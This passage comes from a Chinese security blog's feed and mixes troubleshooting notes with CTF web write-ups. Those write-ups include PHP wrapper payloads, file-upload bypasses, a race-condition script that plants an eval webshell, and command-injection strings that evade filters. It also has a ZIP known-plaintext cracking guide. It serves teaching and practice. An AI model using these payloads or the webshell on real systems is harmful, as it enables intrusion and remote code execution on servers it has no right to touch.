src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1622299-20220311151213389-1526416476.png" alt="img"></p>]]></content>
    
    
    <summary type="html">🥧kali中暴力破解工具john的使用方法以及命令解析;/etc/passwd文件和/etc/shadow文件格式;linux密码爆破实例;出现报错：“UTF-8 No password hashes loaded”的原因及解决方法</summary>
    
    
    
    <category term="web渗透" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="工具使用" scheme="https://blog.m3x1.cn/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>BurpSuite中文版出现显示错位情况解决</title>
    <link href="https://blog.m3x1.cn/posts/3f399677.html"/>
    <id>https://blog.m3x1.cn/posts/3f399677.html</id>
    <published>2025-03-17T16:00:00.000Z</published>
    <updated>2025-03-20T16:06:00.416Z</updated>
    
    <content type="html"><![CDATA[<h4 id="问题描述">问题描述</h4><p>​在使用BurpSuite汉化版时抓取http数据包出现显示错位情况，这是因为中文版的字体不一样导致的，需要修改字体。</p><h4 id="解决方法">解决方法</h4><p>​修改BurpSuite汉化版的http字体显示。</p><p>打开设置，在message editor中找到“HTTP消息的显示方式”，修改如下</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a3f0228200b1b14ba279f13876b27bc1.png" alt="img"></p>]]></content>
    
    
    <summary type="html">🥧BurpSuite中文版出现显示错位情况解决-修改字体</summary>
    
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>刷题2025.3.15</title>
    <link href="https://blog.m3x1.cn/posts/a546d02c.html"/>
    <id>https://blog.m3x1.cn/posts/a546d02c.html</id>
    <published>2025-03-14T16:00:00.000Z</published>
    <updated>2025-03-18T14:15:08.956Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>题目来源：NSSCTF平台</p></blockquote><p>[TOC]</p><h4 id="SWPUCTF-2021-新生赛-easyupload2-0">[SWPUCTF 2021 新生赛]easyupload2.0</h4><blockquote><p>考点：文件上传绕过</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315181309418.png" alt="image-20250315181309418"></p><p>进行文件上传测试，首先上传jpg文件，然后抓包改成php文件，结果提示php文件不能上传。</p><p>上传htaccess文件也不行，于是改成后缀为phtml。</p><p>phtml也会被当成php解析。</p><p>发现上传成功，用蚁剑连接，找到flag.</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315181643259.png" alt="image-20250315181643259"></p><blockquote><p>NSSCTF{76333d4d-efe1-4a18-acf5-09bd35c8ca3b}</p></blockquote><h4 id="SWPUCTF-2021-新生赛-PseudoProtocols">[SWPUCTF 2021 新生赛]PseudoProtocols</h4><blockquote><p>考点：PHP伪协议，文件包含</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315191122515.png" alt="image-20250315191122515"></p><p>先扫一下目录，发现什么都没有，然后看到需要传参，又要读取hint.php，使用filter伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=/var/www/html/hint.php</span><br></pre></td></tr></table></figure><p>得到一串base64，解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4=</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//go to /test2222222222222.php</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>直接访问/test2222222222222.php</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315191348678.png" alt="image-20250315191348678"></p><p>直接使用data协议绕过file_get_contents函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?a=data://text/plain;base64,SSB3YW50IGZsYWc=</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315191105190.png" alt="image-20250315191105190"></p><blockquote><p>NSSCTF{74d9bfc7-cdff-4a86-a6c0-f76568061d63}</p></blockquote><h4 id="FSCTF-2023-加速加速">[FSCTF 2023]加速加速</h4><blockquote><p>考点：条件竞争</p></blockquote><p>先把后缀改成.jpg拿到对方保存文件的路径，为当前路径下的upload目录里。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/34c2cf74b08950b8f9f87a2ebccb2bbd.png" alt="1698321877579">看见标签是条件竞争，那就按照条件竞争的方法去做。</p><p>先创建一个jz-cmd.php文件，运行创建cmd.php文件并写入一句话木马的命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $f=fopen(&quot;cmd.php&quot;,&quot;w&quot;); fputs($f,&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>先抓取上传文件的数据包，再抓取访问upload文件夹里的jz-cmd.php这两个数据包；虽然上传jz-cmd.php是不被允许的，但其实这个文件在服务器上有存在过，只是很快就被删除了。所以我们用BP疯狂发包访问upload文件夹下的jz-cmd.php文件是道理的。而只要此jz-cmd.php被访问成功，就会在upload文件夹里创建cmd.php这个后门文件。</p><p>具体操作就是抓取上传和访问的数据包，然后将他们都放入intruder中，设置如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8367695e46096811033b203f54941d0f.png" alt="1698322910515"></p><p>然后就先攻击发送的数据包，再攻击读取（读取cmd.php）的数据包。读取的包出现200，且浏览器能正常访问，说明一句话木马就写入进去了，用蚁剑连接找到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-15%20202450.png" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315202512251.png" alt="image-20250315202512251"></p><blockquote><p>FSCTF{p@ti0ns_15_key_1n_1ife}</p></blockquote>]]></content>
    
    
    <summary type="html">2025.3.15刷题题目:[SWPUCTF 2021 新生赛]easyupload2.0,[SWPUCTF 2021新生赛]PseudoProtocols,[FSCTF 2023]加速加速</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://blog.m3x1.cn/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>Git问题：解决“ssh:connect to host github.com port 22: Connection timed out”</title>
    <link href="https://blog.m3x1.cn/posts/e4e8b439.html"/>
    <id>https://blog.m3x1.cn/posts/e4e8b439.html</id>
    <published>2025-02-18T16:00:00.000Z</published>
    <updated>2025-03-25T04:40:15.465Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="问题描述：">问题描述：</h2><p>在某一天使用hexo d命令时突然出现报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh:connect to host github.com port 22: Connection timed out</span><br></pre></td></tr></table></figure><p>之前都是可以链接的，后来换了地方突然链接不上github了。</p><h2 id="问题分析：">问题分析：</h2><p>根据错误提示知道，连接不成功可能是：</p><ol><li>网络问题</li><li>ssh密钥需要重新添加</li><li>22端口被占用</li></ol><p>根据此进行尝试解决，应该能解决。我就是第三个问题</p><h2 id="解决方法：">解决方法：</h2><h4 id="情况一：">情况一：</h4><p>检查网络连接情况，检查代理是否开启。然后ping一下看看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping github.com</span><br></pre></td></tr></table></figure><h4 id="情况二：">情况二：</h4><p>直接重新添加ssh密钥就行</p><h4 id="情况三：">情况三：</h4><p>这也是我的情况，可能是22端口不行或者被占用，就需要换个端口。</p><p>操作方法：</p><p>1.进入~/.ssh下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.ssh</span><br></pre></td></tr></table></figure><p>2.创建一个config文件(这里我用的vim编辑器)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim config</span><br></pre></td></tr></table></figure><p>3.编辑文件内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User git</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br><span class="line"></span><br><span class="line">Host gitlab.com</span><br><span class="line">Hostname altssh.gitlab.com</span><br><span class="line">User git</span><br><span class="line">Port 443</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">12345678910111213</span><br></pre></td></tr></table></figure><p>4.保存退出</p><p>5.检查是否成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>这里要根据它的提示操作，有个地方要输入yes。</p><p>然后再试试hexo d，估计就能提交了。</p><p>（<a href="http://xn--pinggithub-wj2ph1j7w8fubmba3571oi6a.com">但是我还是ping不通github.com</a>，不知道为什么，但是换个端口也能传上去。有大佬知道的请指教！）</p>]]></content>
    
    
    <summary type="html">🥧Git问题：解决“ssh:connect to host github.com port 22: Connection timed out”</summary>
    
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>本地搭建deepseek</title>
    <link href="https://blog.m3x1.cn/posts/ca8cf98d.html"/>
    <id>https://blog.m3x1.cn/posts/ca8cf98d.html</id>
    <published>2025-02-18T16:00:00.000Z</published>
    <updated>2025-03-25T04:40:36.200Z</updated>
    
    <content type="html"><![CDATA[<h2 id="准备阶段">准备阶段</h2><p>先下载Ollama和chatbox安装包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ollama: https://ollama.com/</span><br><span class="line">chatbox: https://chatboxai.app/zh</span><br></pre></td></tr></table></figure><p>在电脑上安装后即可</p><h2 id="搭建步骤">搭建步骤</h2><p>安装之后，按win+r，输入cmd进入命令框</p><p>然后我们在回到ollama的官网：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219215910238.png" alt="image-20250219215910238"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220104107.png" alt="image-20250219220104107"></p><p>复制后面的代码到命令框下载，等待它下载完</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220218270.png" alt="image-20250219220218270"></p><p>然后打开chatbox，选择使用本地模型</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220351053.png" alt="image-20250219220351053"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220409690.png" alt="image-20250219220409690"></p><p>模型位置点击三角形位置选择安装好的deepseek模型，上下文消息数量20那个位置记得选择不限制。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220432827.png" alt="image-20250219220432827"></p><p>根据自己喜好设置其他选项，点击保存，然后就可以试试对话了。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220640616.png" alt="image-20250219220640616"></p><p>至此初始化就完成了，基本的功能就完成了。</p><h2 id="启动注意事项">启动注意事项</h2><p>每次在chatbox启动的时候，都要先在命令框输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ollama list    #查看mode</span><br><span class="line">ollama run modename    #运行mode</span><br></pre></td></tr></table></figure><p>然后才能在chatbox本地使用。</p><p>否则会报错没有网络。</p>]]></content>
    
    
    <summary type="html">🥧本地搭建deepseek</summary>
    
    
    
    <category term="其他学习笔记" scheme="https://blog.m3x1.cn/categories/%E5%85%B6%E4%BB%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="其他学习笔记" scheme="https://blog.m3x1.cn/tags/%E5%85%B6%E4%BB%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub技能树-rce</title>
    <link href="https://blog.m3x1.cn/posts/72fb0684.html"/>
    <id>https://blog.m3x1.cn/posts/72fb0684.html</id>
    <published>2025-01-31T16:00:00.000Z</published>
    <updated>2025-02-01T13:26:47.646Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="eval执行">eval执行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    eval($_REQUEST[&quot;cmd&quot;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>没有任何绕过，直接执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=system(&#x27;ls /&#x27;);</span><br><span class="line">?cmd=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{953435d20ae6652047e620c4}</p></blockquote><h2 id="文件包含">文件包含</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128231455539.png" alt="image-20241128231455539"></p><p>审计代码，发现过滤了flag关键字，include包含文件的内容，根据提示，发现有个shell.txt文件，而且文件内容是接受传参请求，可以利用这个漏洞。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234155787.png" alt="image-20241128234155787"></p><p>所以思路就是文件包含shell.txt文件，然后传参触发eval函数来rce。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=shell.txt&amp;ctfhub=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{e95bf56ca09c475de96779f8}</p></blockquote><h2 id="php-input">php://input</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234417464.png" alt="image-20241128234417464"></p><p>有个phpinfo()的网页，打开，搜索flag，没有。</p><p>根据提示使用php://input协议</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234916846.png" alt="image-20241128234916846"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234946005.png" alt="image-20241128234946005"></p><blockquote><p>ctfhub{fd2d24ec67a3d02745d252ec}</p></blockquote><h2 id="读取源代码">读取源代码</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128235118224.png" alt="image-20241128235118224"></p><p>根据代码和提示，要使用php协议读取目录/flag</p><p>直接使用filter协议读取，构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{ad11f5cf0c3528e0097fc84f}</p></blockquote><h2 id="远程包含">远程包含</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128235615623.png" alt="image-20241128235615623"></p><p>跟上面的题目一样,直接使用php://input，然后写入一句话木马</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129000043701.png" alt="image-20241129000043701"></p><p>蚁剑连接，拿到flag</p><blockquote><p>ctfhub{bc23c4d608ef1b89ff1d8564}</p></blockquote><h2 id="命令注入">命令注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $cmd = &quot;ping -c 4 &#123;$_GET[&#x27;ip&#x27;]&#125;&quot;;</span><br><span class="line">    exec($cmd, $res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出来是一个ping网址的功能，先试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls -al</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250201210701699.png" alt="image-20250201210701699"></p><p>打开278612477123991.php</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250201211032131.png" alt="image-20250201211032131"></p><blockquote><p>ctfhub{7c642fd3989abe8db46cf948}</p></blockquote><h2 id="过滤cat">过滤cat</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/cat/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>过滤了cat，但是可以用tac</p><blockquote><p>ctfhub{7c7a18aea2905940e36dd90e}</p></blockquote><h2 id="过滤空格">过滤空格</h2><p>过滤了空格可以用${IFS}代替</p><blockquote><p>ctfhub{635b63dfee2f877be2058c7c}</p></blockquote><h2 id="过滤目录分隔符">过滤目录分隔符</h2><p>过滤了目录分隔符，但是可以使用命令拼接来找flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cd flag_is_here;ls -al</span><br><span class="line">127.0.0.1;cd flag_is_here;cat flag_31274326351910.php</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{0a399fadb5bd0716775832b5}</p></blockquote><h2 id="过滤运算符">过滤运算符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/(\||\&amp;)/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>过滤了|和&amp;符号，但是可以用分号;</p><blockquote><p>ctfhub{83f8b09d42bb7631282a83b4}</p></blockquote><h2 id="综合过滤练习">综合过滤练习</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析一下，过滤了|&amp;; ，可以使用%0a来作为回车符使用，效果一样</p><p>过滤三个关键字cat,flag,ctfhub，可以使用两个单引号或者两个双引号绕过</p><p>过滤空格，可以使用${IFS}绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1%0als$&#123;IFS&#125;-al%0acd$&#123;IFS&#125;fla&#x27;&#x27;g_is_here%0aca&#x27;&#x27;t$&#123;IFS&#125;f*</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130130405955.png" alt="image-20241130130405955"></p><blockquote><p>ctfhub{cbff46daeb4e000265fb35d6}</p></blockquote>]]></content>
    
    
    <summary type="html">CTFHub技能树-rce系列wp</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://blog.m3x1.cn/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>两种明文攻击</title>
    <link href="https://blog.m3x1.cn/posts/fcd8d963.html"/>
    <id>https://blog.m3x1.cn/posts/fcd8d963.html</id>
    <published>2025-01-19T16:00:00.000Z</published>
    <updated>2025-01-21T06:22:40.574Z</updated>
    
    <content type="html"><![CDATA[<h4 id="一、完整的明文文件">一、完整的明文文件</h4><p>要达成明文攻击需要注意以下三点</p><p>①完整的明文文件</p><p>②明文文件需要被相同的压缩算法标准压缩（也可理解为被相同压缩工具压缩）</p><p>③明文对应文件的加密算法需要是 ZipCrypto（ZipCrypto又分为ZipCrypto Deflate/ZipCrypto Store）</p><p>使用ARCHPR进行明文攻击</p><p>破解时长应该不超过5分钟，运行至5分钟左右可以手动停止，ARCHPR会跳出来破解出的三个key。当然，这个结果并不是压缩包的密码，而是一个去除密码的压缩包<code>xxx_decrypted.zip</code>，把这个文件直接解开就可以了。</p><p>用以上方法需要已知一整个明文文件。</p><h4 id="二、已知一部分明文">二、已知一部分明文</h4><p>使用rbkcrack只需要知道加密压缩包内容的连续12个字节，即可进行攻击破解。同时，结合各类已知的文件格式，更扩宽了ZIP已知明文攻击的攻击面。</p><blockquote><p>rbkcrack下载地址：</p><p><a href="https://github.com/Aloxaf/rbkcrack">https://github.com/Aloxaf/rbkcrack</a></p></blockquote><p>rbkcrack常用参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-C 加密的压缩包</span><br><span class="line">-c 压缩包内加密的文件</span><br><span class="line">-p 明文内容</span><br><span class="line">-k 输入key</span><br><span class="line">-o 偏移量</span><br><span class="line">-d 攻击完成后导出解密文件</span><br><span class="line">-u 自动解压</span><br></pre></td></tr></table></figure><p>实例：</p><p>png是制作的png文件头</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbkcrack<span class="selector-class">.exe</span> -C LP<span class="selector-class">.zip</span> -c LP<span class="selector-class">.png</span> -<span class="selector-tag">p</span> png</span><br></pre></td></tr></table></figure><p>拿到key后进行解密</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbkcrack.exe -C LP.zip -c LP.png -k <span class="number">0f</span>518bd2 <span class="number">680365f</span>9 <span class="number">0</span>ecf26a8 -d <span class="keyword">out</span>.png</span><br></pre></td></tr></table></figure><p>因为LP.zip是以ZipCrypto Deflate方式加密的</p><p>所以解密后注意得到的out.png是deflate的数据流，需要使用python脚本进行解码</p><p>在rbkcrack的tools里找到这个脚本</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python inflate.py &lt; <span class="keyword">out</span>.png &gt; out1.png</span><br></pre></td></tr></table></figure><p>至此大功告成，成功提取到压缩文件里的LP.png</p>]]></content>
    
    
    <summary type="html">🥧两种明文攻击</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="misc姿势" scheme="https://blog.m3x1.cn/tags/misc%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>2024年春秋杯网络安全联赛冬季赛wp-1.19</title>
    <link href="https://blog.m3x1.cn/posts/55fde2b7.html"/>
    <id>https://blog.m3x1.cn/posts/55fde2b7.html</id>
    <published>2025-01-18T16:00:00.000Z</published>
    <updated>2025-01-22T06:51:48.573Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web">web</h2><h4 id="easy-php">easy_php</h4><blockquote><p>考点：文件上传绕过，截断，源码审计</p></blockquote><p>打开网站后，可以下载源码，先下载源码，然后再扫一下网站目录</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181445364.png" alt="image-20250119181445364"></p><p>配合源码审计，审计过程省略。其中在文件上传的目录下已经有文件了，再结合提示可以知道，不用再自己上传文件。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181544673.png" alt="image-20250119181544673"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181621889.png" alt="image-20250119181621889"></p><p>那么就需要触发文件，看这里代码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181707567.png" alt="image-20250119181707567"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181802190.png" alt="image-20250119181802190"></p><p>可以知道在/file.php页面中可以进行url的get传参，然后会将参数值过滤后进行高亮，触发反序列化链。</p><p>但是这里的过滤中，是f1ag而不是flag，所以其实没有过滤flag关键词。</p><p>因此结合源码，直接构造payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/flag</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119182045246.png" alt="image-20250119182045246"></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a16dcb7549915546893a27a6d7927615&#125;</span><br></pre></td></tr></table></figure></blockquote><h4 id="easy-code">easy_code</h4><blockquote><p>考点：利用PHP特性绕过，filter伪协议</p></blockquote><p>访问/robots.txt 可以看到有 gogogo.php</p><p>ctfer 参数有三个检测，只需要用科学计数法，PHP 会自动四舍五入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 